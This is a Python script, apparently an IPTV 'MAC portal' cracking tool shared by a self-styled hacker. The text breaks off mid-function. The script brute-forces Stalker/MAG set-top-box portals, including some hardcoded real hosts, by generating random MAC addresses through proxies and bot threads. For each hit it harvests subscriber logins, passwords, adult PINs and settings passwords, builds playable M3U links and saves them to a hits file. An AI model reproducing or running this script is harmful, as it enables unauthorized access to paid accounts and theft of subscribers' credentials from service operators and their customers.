# ᴄʀᴀᴄᴋɪɴɢ ɪs ɴᴏᴛ ᴀ ᴄʀɪᴍᴇ ɪs ᴀʀᴛ
#
# Encoded - Decoded  by  TUGA
# Telegram ( @RICKY_Green_Hat )
# Copyright © ... DON'T BE A COPY & PASTE
#
# ᴾʸᵗʰᵒⁿ ᴾʳᵒᵍʳᵃᵐᵐᵉʳ ᵇʸ Tuga (Green Hat Hacker)
# created by TUGA
#
# encoding: utf-8
import os,pip
import datetime,os
import socket,hashlib
import json,random,sys, time,re

try:
	if nickn=="":
		nickn="★𝐓𝐮g𝐚★"
except:
	nickn="★𝐓𝐮g𝐚★"
try:
	import androidhelper as sl4a
	ad = sl4a.Android()
except:pass
import subprocess
try:
	import threading
except:pass
import pathlib
#subprocess.run(["clear", ""])
try:
	import requests
except:
	print("requests module is not installed \n Loading requests module \n")
	pip.main(['install', 'requests'])
import requests
try:
	import sock
except:
	print("sock module not installed \n Loading the sock module \n")
	pip.main(['install', 'requests[socks]'] )
	pip.main(['install', 'sock'] )
	pip.main(['install', 'socks'] )
	pip.main(['install', 'PySocks'] )
import sock
#subprocess.run(["clear", ""])
import logging
try:
    import flag
except:
    pip.main(['install', 'emoji-country-flag'])
    import flag
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.util.ssl_.DEFAULT_CIPHERS="TLS_AES_128_GCM_SHA256:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_256_GCM_SHA384:TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256:TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256:TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256:TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256:TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384:TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384:TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA:TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA:TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA:TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA:TLS_RSA_WITH_AES_128_GCM_SHA256:TLS_RSA_WITH_AES_256_GCM_SHA384:TLS_RSA_WITH_AES_128_CBC_SHA:TLS_RSA_WITH_AES_256_CBC_SHA:TLS_RSA_WITH_3DES_EDE_CBC_SHA:TLS13-CHACHA20-POLY1305-SHA256:TLS13-AES-128-GCM-SHA256:TLS13-AES-256-GCM-SHA384:ECDHE:!COMP:TLS13-AES-256-GCM-SHA384:TLS13-CHACHA20-POLY1305-SHA256:TLS13-AES-128-GCM-SHA256"
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
global option
try:
	import cfscrape
	sesq= requests.Session()
	option = cfscrape.create_scraper(sess=sesq)
except:
	pip.main(['install', 'cfscrape'] )    
	import cfscrape
	sesq= requests.Session()
	option = cfscrape.create_scraper(sess=sesq)


logging.captureWarnings(True)
sidepanel="error" 
signatureside="" 
find=0
hitc=0
statusproxym=0
mtype=""
proxyslen=0

headers = {

}    
def statusproxy():
    if statusproxym==0:
        statusproxy="\33[0m\33[0m\33[0m\33[1;7;100m              ᴘʀᴏxʏ ᴍᴏᴅᴇ ᴏꜰꜰ               \33[0m\33"
        print(statusproxy)
    elif statusproxym==1:
        statusproxy="\33[0m\33[0m\33[0m\33[1;7;100m              ᴘʀᴏxʏ ᴍᴏᴅᴇ ᴏɴ"+mtype+"\33[0m\33"
        print(statusproxy)
protocol=0        
macNumber=999999999999991# 1#number of attempts
Tuga=("""\33[32m╔══════════════════════════════════════════════════════╗  . 
║██████████████████████████████████████████████████████║  .
║██░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░██║  . 
║██░████████╗██╗░░░██╗███████║░░█████|░░░░░░░░░░░░░░░██║  . 
║██░╚══██╔══╝██║░░░██║██╔══██║░██╔══██╗░░░░░░░░░░░░░░██║  .
║██░░░░██║░░░██║░░░██║██║░░██║█████████║░░░░░░░░░░░░░██║  .
║██░░░░██║░░░╚██████╔╝███████║██║░░░║██║░░░░░░░░░░░░░██║  .
║██░░░░╚═╝░░░░╚═════╝░░░╚══██║╚═╝░░░╚══╝░░░░░░░░░░░░░██║  . 
║██░░░░░░░░░░░░░░░░░░████████║░░░░░░░░░░░░®░░░░░░░░░░██║  . 
║██░░░░░░░░░░░░░░░░░░╚═══════╝░░░░░░░░░░░░░░░░░░░░░░░██║  .\033[0;31m 
║██░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░██║  . 
║██░░░░██╗██████╗░████████╗██╗░░░██╗░░░░░░░░░░░░░░░░░██║  .   
║██░░░░██║██╔══██╗╚══██╔══╝██║░░░██║░░░░░░░░░░░░░░░░░██║  . 
║██░░░░██║██████╔╝░░░██║░░░╚██╗░██╔╝░░░░░░░░░░░░░░░░░██║  . 
║██░░░░██║██╔═══╝░░░░██║░░░░╚████╔╝░░░░░░░░░░░░░░░░░░██║  . 
║██░░░░██║██║░░░░░░░░██║░░░░░╚██╔╝░░░░ MAC ░░░░░░░░░░██║  . 
║██░░░░╚═╝╚═╝░░░░░░░░╚═╝░░░░░░╚═╝░░░░░ M3U ░░░░░░░░░░██║  . 
║██░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░██║  . 
║██████████████████████████████████████████████████████║  . 
╚══════════════════════════════════════════════════════╝  .\33[0;1;5;m 
     
\33[1;7;42m  MULTI - SCANNER 🔹 STB MAC - M3U  \33[0m\33[1;44m\33[0m\33[0;1m 
\33[0m\33[0m\33[0m\33[1;7;100m ♦️ ❪❪❪ ALL IN ONE ❫❫❫ ♦️ \33[0m\33[1;44m[★ SCRIPT ★] \33[0m\33[0;1m
\33[0m\33[0m\33[0m\33[1;7;100m              Mod ʙʏ Tuga                \33[0m\33
""")
subprocess.run(["clear", ""])
statusproxy()
print(Tuga)
short=""
specialmac=""
#################
nick='𝐓𝐮g𝐚'
wait=1
names=""

introop="""	\33[1;31m \33[0m\33[1;32mꜱᴇʟᴇᴄᴛ ꜱᴄᴀɴ ᴍᴇᴛʜᴏᴅ  \33[36m
	
	\33[1;31m1 \33[0m\33[1;32m= \33[0m \33[36mᴍᴀᴄ ᴘᴏʀᴛᴀʟ  \33[36m    
	\33[1;31m2 \33[0m\33[1;32m= \33[0m \33[36mᴍ3ᴜ \33[36m

	
	\33[1;31m0 \33[0m\33[1;32m= \33[0m \33[36mᴀᴄᴛɪᴠᴇ ᴘʀᴏxʏ ᴍᴏᴅᴇ \33[36m


\33[36m
Enter ᴏᴘᴛɪᴏɴ : \33[36m\33[36m\33[36m"""
introop=introop+"""\33[0m"""

selectop = input(introop)
print('\33[0m')   

if selectop=="0":
    mtype="                "
    proxy = requests.session()
    option=proxy
    statusproxym=1
    subprocess.run(["clear", ""])
    statusproxy()
    print(Tuga)    
    dirp='/sdcard/proxy/' 
    count=0
    fil=""
    for files in os.listdir (dirp):
        count=count+1
        fil=fil+"	\33[1;31m"+str(count)+"\33[0m\33[1;32m = \33[0m \33[36m"+files+'\33[36m\n'
    print ("""
	\33[1;31m \33[0m\33[1;32mꜱᴇʟᴇᴄᴛ ᴘʀᴏxʏ ꜰɪʟᴇ  \33[36m
        	
"""+fil+"""""")
    proxyfile=str(input("""\33[36m
Enter ᴏᴘᴛɪᴏɴ : \33[36m\33[36m\33[36m"""))
    count=0
        
    
    subprocess.run(["clear", ""])
    statusproxy()
    print(Tuga)
    typeproxy="""	\33[1;31m \33[0m\33[1;32mꜱᴇʟᴇᴄᴛ ᴘʀᴏxʏ ᴛʏᴘᴇ  \33[36m
    	
	\33[1;31m1 \33[0m\33[1;32m= \33[0m \33[36mʜᴛᴛᴘ  \33[36m    
	\33[1;31m2 \33[0m\33[1;32m= \33[0m \33[36mꜱᴏᴄᴋ4 \33[36m
	\33[1;31m3 \33[0m\33[1;32m= \33[0m \33[36mꜱᴏᴄᴋ5 \33[36m
    
    
\33[36m
Enter ᴏᴘᴛɪᴏɴ : \33[36m\33[36m\33[36m"""
    typeproxy=typeproxy+"""\33[0m"""
    proxyoption=input(typeproxy)    

    if proxyoption=="":
        print("ERROR: Select proxy protocol")
        quit()
        
 
      
    if proxyoption=="1":        
        protocol=1
        mtype=" [HTTP]         "
    elif proxyoption=="2":
        protocol=2
        mtype=" [SOCK4]        "
    elif proxyoption=="3":
        protocol=3
        mtype=" [SOCK5]        "
    else:
        print("ERROR: Incorrect Option")
        quit()
        
    subprocess.run(["clear", ""])
    statusproxy()
    print(Tuga)
    introop="""	\33[1;31m \33[0m\33[1;32mꜱᴇʟᴇᴄᴛ ꜱᴄᴀɴ ᴍᴇᴛʜᴏᴅ  \33[36m
    	
	\33[1;31m1 \33[0m\33[1;32m= \33[0m \33[36mᴍᴀᴄ ᴘᴏʀᴛᴀʟ  \33[36m    
	\33[1;31m2 \33[0m\33[1;32m= \33[0m \33[36mᴍ3ᴜ \33[36m
    
    	
	\33[1;32m[ ᴘʀᴏxʏ ᴍᴏᴅᴇ ᴏɴ ]\33[36m
    
    
\33[36m
Enter ᴏᴘᴛɪᴏɴ : \33[36m\33[36m\33[36m"""
    introop=introop+"""\33[0m"""
    
    selectop = input(introop)
    print('\33[0m')   

    
if selectop=="1":    
    intro="""	\33[1;31m \33[0m\33[1;32mꜱᴇʟᴇᴄᴛ ᴘᴏʀᴛᴀʟ ᴛʏᴘᴇ  \33[36m

    	\33[1;31m1 \33[0m\33[1;32m= \33[0m \33[36mᴘᴏʀᴛᴀʟ.ᴘʜᴘ  \33[36m    
    	\33[1;31m2 \33[0m\33[1;32m= \33[0m \33[36msᴛᴀʟᴋᴇʀ_ᴘᴏʀᴛᴀʟ \33[36m
    
    
\33[36m
Enter Option : \33[36m\33[36m\33[36m"""
    intro=intro+"""\33[0m"""
    subprocess.run(["clear", ""])
    statusproxy()
    print(Tuga)
    panel = input(intro)
    print('\33[0m')
    speed=""
    options=""
    portalm="portal.php"
    useragent="okhttp/4.7.1"
    if  panel=="0":
        	portalm=input('Portal: ')
        	useragent="Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3" 
    if  panel=="" or panel=="1":
        	portalm="portal.php"    	
        	useragent="Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3"     	
    if panel=="2":
        	portalm="server/load.php"
        	options="S"
        	useragent="Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3" 
    realblue=""
    if panel=="4":
    	realblue="real"
    print('\33[0m')	
    print(panel)
    channelcate="0"
    panel='Tuga'


    subprocess.run(["clear", ""])
    statusproxy()
    print(Tuga)    
    
    #ss=input()
    totLen="000000"
    filea=""
    newgeneration=(
    'D4:CF:F9:',
    '33:44:CF:',
    '10:27:BE:',
    'A0:BB:3E:',
    '55:93:EA:',  
    '04:D6:AA:',
    '11:33:01:',
    '00:1C:19:',
    '1A:00:6A:',
    '1A:00:FB:',
    '00:A1:79:',
    '00:1B:79:',
    '00:2A:79:',
    '00:1A:79:',
    )
    
    multim="""  
    	\33[1;31m \33[0m\33[1;32mꜱᴄᴀɴ ᴍᴜʟᴛɪᴘᴏʀᴛᴀʟꜱ?  \33[36m    
    	
    	\33[1;31m1 \33[0m\33[1;32m= \33[0m \33[36mYes \33[36m
    	\33[1;31m2 \33[0m\33[1;32m= \33[0m \33[36mNo \33[36m
    
    
\33[36m
Enter ᴏᴘᴛɪᴏɴ : \33[36m\33[36m\33[36m"""
    multim=multim+"""\33[0m"""
    
    multipanel = input(multim)
    print('\33[0m')
    optional=""
    panels=""
    subprocess.run(["clear", ""])
    statusproxy()
    print(Tuga) 
    if multipanel == "1":
     	dir='/sdcard/combo/' 	
     	if not os.path.exists(dir):
      	   os.mkdir(dir)
     	if "1"=="1":
      		count=0
      		fil=""
    
     	for files in os.listdir (dir):
     		count=count+1
     		fil=fil+"	\33[1;31m"+str(count)+"\33[0m\33[1;32m = \33[0m \33[36m"+files+'\33[36m\n'
     	print ("""
    	\33[1;31m \33[0m\33[1;32mꜱᴇʟᴇᴄᴛ ᴄᴏᴍʙᴏ ꜰɪʟᴇ  \33[36m
    	
    """+fil+"""
    	""")
     	panels=str(input("""\33[36m
Enter ᴏᴘᴛɪᴏɴ : \33[36m\33[36m\33[36m"""))
     	count=0
    else:
     	subprocess.run(["clear", ""])
     	statusproxy()
     	print(Tuga) 
     	print("""
    	\33[1;31m \33[0m\33[1;32mᴡʀɪᴛᴇ ᴘᴏʀᴛᴀʟ ᴜʀʟ\33[36m""")
     	optional=input("""\33[36m
Enter ᴘᴏʀᴛᴀʟ : \33[36m\33[36m\33[36m""")
    if optional == "":
        if portalm=="portal.php":
            optional="http://s2.iptv66.tv:80/c/"
        else:
            optional="144.217.77.180/stalker_portal"
    while True:
        subprocess.run(["clear", ""])
        statusproxy()
        print(Tuga) 
        print("""
    	\33[1;31m \33[0m\33[1;32mꜱᴇʟᴇᴄᴛ ɴᴜᴍʙᴇʀ ʙᴏᴛꜱ\33[36m
    	
    	\33[1;31mʙᴏᴛꜱ ᴏᴘᴛɪᴏɴꜱ  \33[0m\33[1;32m= \33[0m \33[36m1 - 15 \33[36m
    """)
        optionbots=input("""\33[36m
Enter ʙᴏᴛꜱ : \33[36m\33[36m\33[36m""")
        optionbots=int(optionbots)
        if optionbots <= 15:
            break    
    subprocess.run(["clear", ""])
    statusproxy()
    print(Tuga) 
    macupset=input("""
    	\33[1;31m \33[0m\33[1;32mᴡʀɪᴛᴇ ᴛʜᴇ ɴᴜᴍʙᴇʀ ᴏꜰ ᴍᴀᴄꜱ\33[36m	
    		
    	\33[1;31m*\33[0m \33[36mᴅᴇꜰᴀᴜʟᴛ ᴍᴀᴄ ꜰᴏʀᴍᴀᴛ = 00:1A:79:XX:XX\33[36m
    	\33[1;31m0 \33[0m\33[1;32m= \33[0m \33[36mᴄʜᴀɴɢᴇ ᴍᴀᴄ ꜰᴏʀᴍᴀᴛ \33[36m

\33[36m    	
Enter ɴᴜᴍʙᴇʀ ᴍᴀᴄꜱ : \33[36m\33[36m\33[36m""")
    
    changeformat=macupset
    if macupset=="":
    	macupset=30000
    macupset=int(macupset) 
    #print(macupset)
     		
    if "1"=="1":
     	filnr="0"
     	count=0
     	macmodel=14
     	macmodel=newgeneration[int(macmodel)-1]
     	if changeformat=="0":
     		subprocess.run(["clear", ""])
     		statusproxy()
     		print(Tuga) 
     		generation=str(newgeneration)
     		generation=(generation.count(',')+1)
     		print(" ")
     		print("	\33[1;31m \33[0m\33[1;32mᴛʏᴘᴇ ᴏꜰ ᴍᴀᴄꜱ\33[36m")
     		print(" ")
     		for xd in range(0,(generation)):
     			tire='  ='
     			if int(xd) <9:
     				tire='   =' 			
     			print("	"+str(xd+1)+"\33[1;31m"+tire+"\33[0m \33[36m"+newgeneration[xd]+"\33[36m")
     		macmodel=input("""
     			
    \33[1;31m*\33[0m \33[36mᴅᴇꜰᴀᴜʟᴛ ᴏᴘᴛɪᴏɴ: 14 \33[36m

\33[36m    
Enter ᴍᴀᴄ ꜰᴏʀᴍᴀᴛ : \33[36m\33[36m\33[36m""")
     		macmodel=newgeneration[int(macmodel)-1]     		
     		#print(macmodel)     		
     		subprocess.run(["clear", ""])
     		statusproxy()
     		print(Tuga) 
     		macupset=input("""
    \33[1;31m \33[0m\33[1;32mᴡʀɪᴛᴇ ᴛʜᴇ ɴᴜᴍʙᴇʀ ᴏꜰ ᴍᴀᴄꜱ\33[36m		

\33[36m    
Enter ɴᴜᴍʙᴇʀ ᴍᴀᴄꜱ : \33[36m\33[36m\33[36m""")
     		if macupset=="":
     			macupset=30000
     		macupset=int(macupset) 
     		print(macupset) 		 		
    	 	count=0
    	 	
     	subprocess.run(["clear", ""])
     	statusproxy()
     	print(Tuga) 
    
    #print(macmodel)
    #quit()
    channelcate=""
    channelcate=input("""  
    \33[1;31m \33[0m\33[1;32mInclude Channel Categories in output?  \33[36m    
    	
    \33[1;31m1 \33[0m\33[1;32m= \33[0m \33[36mᴏɴʟʏ ʟɪᴠᴇ \33[36m
    \33[1;31m2 \33[0m\33[1;32m= \33[0m \33[36mCountry Channel category only \33[36m
    \33[1;31m3 \33[0m\33[1;32m= \33[0m \33[36mAdd all (Live-VOD SERIES) \33[36m
    
    
\33[36m
Enter ᴏᴘᴛɪᴏɴ : \33[36m\33[36m\33[36m""")
    if channelcate=="":
    	channelcate="1"
    
    
    ip=""
    fname=""
    adult=""
    play_token=""
    acount_id=""
    stb_id=""
    stb_type=""
    sespas=""
    stb_c=""
    timezon=""
    tloca=""
    scountry=""
    stariff=""
    slogin=""
    smaxonline=""
    sparent=""
    ssettings=""
    spass=""
    stariffplan=""
    tdata=""
    data_stalker=""
    sip=""
    istalker=""
    
           
    import os,platform,sys
    
    acount_id=""
    a="0123456789ABCDEF"
    sd=0
    vpncount=0
    hitcount=0
    oncount=0
    sdd=0
    vcount=0
    bad=0
    proxies=""
    count=1
    subprocess.run(["clear", ""])
    statusproxy()
    print(Tuga) 
    filename=str(input("""
    \33[1;31m \33[0m\33[1;32mꜰɪʟᴇ ɴᴀᴍᴇ ᴛᴏ ꜱᴀᴠᴇ  \33[36m    
    
\33[36m
Enter Name File : \33[36m\33[36m\33[36m"""))
    if filename=="":
    	filename="Tuga_Hits"
    hits='/sdcard/Hits/'
    if not os.path.exists(hits):
        os.mkdir(hits)
    filename=filename+"_Tuga"
    Fileb=hits+filename+".txt"
    count=1
    subprocess.run(["clear", ""])
    statusproxy()
    print(Tuga)
    print("""
    
    \33[1;31m* \33[0m\33[0m \33[36mLoading... \33[36m""")
    def write(hits):
        file=open(Fileb,'a+', encoding='utf-8') 
        file.write(hits)
        file.close()	
        
    def month_string_to_number(month):
        m = {
            'jan': 1,
            'feb': 2,
            'mar': 3,
            'apr':4,
             'may':5,
             'jun':6,
             'jul':7,
             'aug':8,
             'sep':9,
             'oct':10,
             'nov':11,
             'dec':12
            }
        s = month.strip()[:3].lower()
        try:
            out = m[s]
            return out
        except:
            raise ValueError('Not a month')
    import time
    from datetime import date
    def date_clear(dat):
    	#dat=date_exp
    	month=""
    	day=""
    	year=""
    	trai=""
    	my_date=""
    	sondat=""
    	out=""
    	month=str(dat.split(' ')[0])
    	day=str(dat.split(', ')[0].split(' ')[1])
    	year=str(dat.split(', ')[1])
    	month=str(month_string_to_number(month))
    	#print(month)
    	trai=str(day)+'/'+str(month)+'/'+str(year)
    	my_date = str(trai)
    	#print(my_date)
    	if 1==1:
    		
    		d = date(int(year), int(month), int(day))
    		sondat = time.mktime(d.timetuple())
    		out=(int((sondat-time.time())/86400))
    		return out
    	#except:pass
    macs=""	
    number=1
    
    def randommac():
    	try:
    		genmac = str(macmodel)+"%02x:%02x:%02x"% ((random.randint(0, 256)),(random.randint(0, 256)),(random.randint(0, 256)))
    		#print(genmac)
    	except:pass
    	genmac=genmac.replace(':100',':10')
    	return genmac
         
                       
    	
    def searcht(s, first, last):
            try:
                start = s.index(first) + len(first)
                end = s.index(last, start)
                return s[start:end]
            except ValueError:
                return ''
                	
    def url1(panel):
    	url="http://"+panel+"/"+portalm+"?type=stb&action=handshake&prehash=false&JsHttpRequest=1-xml" 
    	return url
    try:
    	if macsv=="":
    		mac=""
    except:
    	macsv=""
    def url22(panel,macs):
    	url2="http://"+panel+"/"+portalm+"?type=stb&action=get_profile&JsHttpRequest=1-xml" 
    
    	if realblue=="real":
    		url2="http://"+panel+"/"+portalm+"?&action=get_profile&mac="+macs+"&type=stb&hd=1&sn=&stb_type=MAG250&client_type=STB&image_version=218&device_id=&hw_version=1.7-BD-00&hw_version_2=1.7-BD-00&auth_second_step=1&video_out=hdmi&num_banks=2&metrics=%7B%22mac%22%3A%22"+macs+"%22%2C%22sn%22%3A%22%22%2C%22model%22%3A%22MAG250%22%2C%22type%22%3A%22STB%22%2C%22uid%22%3A%22%22%2C%22random%22%3A%22null%22%7D&ver=ImageDescription%3A%200.2.18-r14-pub-250%3B%20ImageDate%3A%20Fri%20Jan%2015%2015%3A20%3A44%20EET%202016%3B%20PORTAL%20version%3A%205.6.1%3B%20API%20Version%3A%20JS%20API%20version%3A%20328%3B%20STB%20API%20version%3A%20134%3B%20Player%20Engine%20version%3A%200x566"
    	return url2
    		
    def url3(panel):
    	url3="http://"+panel+"/"+portalm+"?type=account_info&action=get_main_info&JsHttpRequest=1-xml" 
    	return url3
    
    def url5(panel):
    	url5="http://"+panel+"/"+portalm+"?action=create_link&type=itv&cmd=ffmpeg%20http://localhost/ch/106422_&JsHttpRequest=1-xml"
    	return url5
    
    def url6(panel):
    	url6="http://"+panel+"/"+portalm+"?type=itv&action=get_all_channels&force_ch_link_check=&JsHttpRequest=1-xml"
    	return url6
    
    def liveurl(panel):
    	liveurl="http://"+panel+"/"+portalm+"?action=get_genres&type=itv&JsHttpRequest=1-xml"
    	return liveurl
    
    def vodurl(panel):
    	vodurl="http://"+panel+"/"+portalm+"?action=get_categories&type=vod&JsHttpRequest=1-xml"
    	return vodurl
    
    def seriesurl(panel):
    	seriesurl="http://"+panel+"/"+portalm+"?action=get_categories&type=series&JsHttpRequest=1-xml"
    	return seriesurl
    
    def url(cid,panel):
    	url7="http://"+panel+"/"+portalm+"?type=itv&action=create_link&cmd=ffmpeg%20http://localhost/ch/"+str(cid)+"_&series=&forced_storage=0&disable_ad=0&download=0&force_ch_link_check=0&JsHttpRequest=1-xml" 
    	return url7
    
    
    def hea1(panel, macs):
    	HEADERA={
    "User-Agent":"Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 1812 Mobile Safari/533.3" ,
    "Referer": "http://"+panel+"/c/" ,
    "Accept": "application/json,application/javascript,text/javascript,text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" ,
    "Cookie": "mac="+macs+"; stb_lang=en; timezone=Europe/Paris;",
    "Accept-Encoding": "gzip, deflate" ,
    "Connection": "Keep-Alive" ,
    "X-User-Agent":"Model: MAG254; Link: Ethernet",
    }
    	return 	HEADERA
    
    def hea2(macs,token,panel):
    	tokens=token
    	#if macsv=="":
    	#	macs=macs.replace('%3A','')
    	#	tokens=str(token)+str(token)
    	HEADERd={
    "User-Agent":"Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 1812 Mobile Safari/533.3" ,
    "Referer": "http://"+panel+"/c/" ,
    "Accept": "application/json,application/javascript,text/javascript,text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" ,
    "Cookie": "mac="+macs+"; stb_lang=en; timezone=Europe/Paris;",
    "Accept-Encoding": "gzip, deflate" ,
    "Connection": "Keep-Alive" ,
    "X-User-Agent":"Model: MAG254; Link: Ethernet",
    "Authorization": "Bearer "+tokens,
    	}
    	return HEADERd
    
    def hea3(panel):
    	hea={
    "Icy-MetaData": "1",
    "User-Agent": "Lavf/57.83.100", 
    "Accept-Encoding": "identity",
    "Host": panel,
    "Accept": "*/*",
    "Range": "bytes=0-",
    "Connection": "close",
    	}
    	return hea
    hitprint=0
    m3uonline=0
    m3uoffline=0
    def stalker(data_stalkerp, data_stalker, panel):
        		
        		stalker=''        		
        		global m3uonline, m3uoffline
        		try:
        		  	sfname=data_stalkerp.split('"fname":"')[1]
        		  	sfname=sfname.split('"')[0]
        		  	spass=data_stalkerp.split('"password":"')[1]
        		  	spass=spass.split('"')[0]
        		  	scountry=data_stalkerp.split('country":"')[1]
        		  	scountry=scountry.split('"')[0]        		  	
        		  	smaxonline=data_stalkerp.split('max_online":"')[1]
        		  	smaxonline=smaxonline.split('"')[0]
        		  	slogin=data_stalkerp.split('login":"')[1]
        		  	slogin=slogin.split('"')[0]
        		  	stariff=data_stalkerp.split('tariff_plan_id":"')[1]
        		  	stariff=stariff.split('"')[0]
        		  	stariffplan=data_stalker.split('tariff_plan":"')[1]
        		  	stariffplan=stariffplan.split('"')[0]
        		  	ssettings=data_stalkerp.split('settings_password":"')[1]
        		  	ssettings=ssettings.split('"')[0]
        		  	sparent=data_stalkerp.split('parent_password":"')[1]
        		  	sparent=sparent.split('"')[0]
        		  	panel=panel.replace("/stalker_portal", "")    		  	   			
        		  	m3u_link="http://"+panel+"/get.php?username="+slogin+"&password="+spass+"&type=m3u_plus&output=m3u8"
        		  	try:
        		  	   req=str(option.get(m3u_checkurl, timeout=(2,5), allow_redirects=False,stream=True).status_code)
        		  	   if req == "200" or (req == "302"):
        		  	      link_status="✅ ONLINE"
        		  	   else:
        		  	      link_status="🛑 OFFLINE"
        		  	except:
        		  	   link_status="🛑 OFFLINE"    		  	      
        		  	try:
        		  	   req=""
        		  	   req=option.get(m3u_link, timeout=(2,5), allow_redirects=False,stream=True)
        		  	   m3u_text=(req.text)
        		  	   m3u_split=m3u_text.split("http://")[1]
        		  	   m3u_split=m3u_split.split("#EXTINF:")[0]
        		  	   m3u_checkurl="http://"+m3u_split
        		  	   req=str(option.get(m3u_checkurl, timeout=(2,5), allow_redirects=False,stream=True).status_code)
        		  	   if req == "200" or (req == "302"):
        		  	      m3uonline+=1
        		  	      m3u_check="""
        		  	      
╭──➤ 🔲 🅼3🆄 🄲🄷🄴🄲🄺
├● ❪🔘❫ 𝙎𝙏𝘼𝙏𝙐𝙎 𝙇𝙄𝙉𝙆 ➤ 
├● """+link_status+"""
├● ❪🔘❫ 𝙎𝙏𝘼𝙏𝙐𝙎 𝘾𝙃𝘼𝙉𝙉𝙀𝙇 ➤ 
├● ✅ ONLINE
╰─◉ 📺 𝙈3𝙐 ➤ """+m3u_link+"""
    """
        		  	      
        		  	   else:
        		  	      m3uoffline+=1
        		  	      m3u_check="""
        		  	      
╭──➤ 🔲 🅼3🆄 🄲🄷🄴🄲🄺
├● ❪🔘❫ 𝙎𝙏𝘼𝙏𝙐𝙎 𝙇𝙄𝙉𝙆 ➤ 
├● """+link_status+"""
├● ❪🔘❫ 𝙎𝙏𝘼𝙏𝙐𝙎 𝘾𝙃𝘼𝙉𝙉𝙀𝙇 ➤ 
├● 🛑 OFFLINE
╰─◉ 📺 𝙈3𝙐 ➤ """+m3u_link+"""
     """
        		  	      
        		  	except:
        		  	   m3uoffline+=1
        		  	   m3u_check="""
        		  	   
╭──➤ 🔲 🅼3🆄 🄲🄷🄴🄲🄺
├● ❪🔘❫ 𝙎𝙏𝘼𝙏𝙐𝙎 𝙇𝙄𝙉𝙆 ➤ 
├● """+link_status+"""
├● ❪🔘❫ 𝙎𝙏𝘼𝙏𝙐𝙎 𝘾𝙃𝘼𝙉𝙉𝙀𝙇 ➤ 
├● 🛑 OFFLINE
╰─◉ 📺 𝙈3𝙐 ➤ """+m3u_link+"""
     """
        		  	
        		  	stalker="""    		  	
╭─➤ 【⭕️ 𝗦𝘁𝗮𝗹𝗸𝗲𝗿_𝗣𝗼𝗿𝘁𝗮𝗹 ⭕️】
├● 👥 Login ➤ """+str(slogin)+"""
├● 🔑 Pass ➤ """+str(spass)[:10]+"""...
├● 📝 Name ➤ """+str(sfname)+"""
├● 🔞 Adult pass ➤ """+str(sparent)+""" 
├● 🆔 Tariff ID ➤ """+str(stariff)+"""
├● 💹 Tariff Plan ➤ """+str(stariffplan)+"""
├● 🔛 Max. Online ➤ """+str(smaxonline)+"""
├● """+data_server(str(scountry))+""" Country ➤ """+str(scountry)+"""
├● ⚙️ Setting Pass ➤ """+str(ssettings)+"""
╰─────────────────⧳
"""+m3u_check+""""""
        		  	#print(stalker)
        		except:pass
        			
        		return stalker
        	   			     		
    def hit(proxysprint,options,mac,dat,real,m3ulink,status,vpn,livelist,vodlist,serieslist,playerapi,panel,SN,SNENC,SNCUT,DEV,DEVENC,SG,SING,SINGENC,isstalker,data_stalkerp,data_stalker):
    	global hitr, m3uonline, m3uoffline
    	global hitprint
    	try:
    		stalkerdata=''
    		if options == "S":
    		    stalkerdata=stalker(data_stalkerp,data_stalker, panel)                 
    		else:
    		    stalkerdata=str(playerapi)
    		
    		
    		if options == "S":
    		    m3u_url=" "
    		else:
    		    try:
        		  	 req=str(option.get(m3ulink, timeout=(2,5), allow_redirects=False,stream=True).status_code)       
        		  	 if req == "200" or (req == "302"):
        		  	    link_status="✅ ONLINE"
        		  	 else:
        		  	    link_status="🛑 OFFLINE"   
    		    except:
        		  	 link_status="🛑 OFFLINE"          		  	         		
    		    try:
        		  	 req=option.get(m3ulink, timeout=(2,5), allow_redirects=False,stream=True)
        		  	 m3u_text=(req.text)
        		  	 m3u_split=m3u_text.split("http://")[1]
        		  	 m3u_split=m3u_split.split("#EXTINF:")[0]
        		  	 m3u_checkurl="http://"+m3u_split
        		  	 req=str(option.get(m3u_checkurl, timeout=(2,5), allow_redirects=False,stream=True).status_code)
        		  	 if req == "200" or (req == "302"):
        		  	    m3uonline+=1
        		  	    m3u_url="""
        		  	    
╭──➤ 🔲 🅼3🆄 🄲🄷🄴🄲🄺
├● ❪🔘❫ 𝙎𝙏𝘼𝙏𝙐𝙎 𝙇𝙄𝙉𝙆 ➤ 
├● """+link_status+"""
├● ❪🔘❫ 𝙎𝙏𝘼𝙏𝙐𝙎 𝘾𝙃𝘼𝙉𝙉𝙀𝙇 ➤ 
├● ✅ ONLINE
╰─◉ 📺 𝙈3𝙐 ➤ """+m3ulink+"""
    """
        		  	   
        		  	 else:
        		  	    m3uoffline+=1
        		  	    m3u_url="""
        		  	    
